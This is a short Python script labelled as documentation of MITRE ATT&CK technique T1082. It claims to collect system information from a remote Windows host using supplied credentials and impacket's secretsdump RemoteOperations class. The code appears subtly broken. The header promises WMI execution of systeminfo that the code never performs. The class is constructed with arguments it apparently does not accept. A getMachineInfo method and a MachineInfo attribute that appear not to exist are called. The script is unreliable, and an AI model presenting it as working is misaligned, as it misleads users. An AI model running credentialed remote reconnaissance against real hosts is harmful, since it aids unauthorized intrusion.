# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1082 - System Information Discovery
# Objective: Gather detailed system configuration. This script uses WMI over SMB to execute systeminfo remotely.

#!/usr/bin/env python3
import sys
from impacket.dcerpc.v5 import transport, samr
from impacket.examples.secretsdump import RemoteOperations

def run_system_info(target, username, password, domain):
    try:
        print(f"[*] Attempting to get system info from {target}...")
        # Use RemoteOperations to execute commands
        remote_ops = RemoteOperations(target, username, password, domain)
        remote_ops.connect()
        remote_ops.getMachineInfo()
        print("[+] System information retrieved successfully.")
        # Print the info stored in the class
        if hasattr(remote_ops, 'MachineInfo'):
            for key, value in remote_ops.MachineInfo.items():
                print(f"    {key}: {value}")
        remote_ops.disconnect()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./T1082_system_info_discovery.py <target> <username> <password> <domain>")
        sys.exit(1)
    
    run_system_info(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])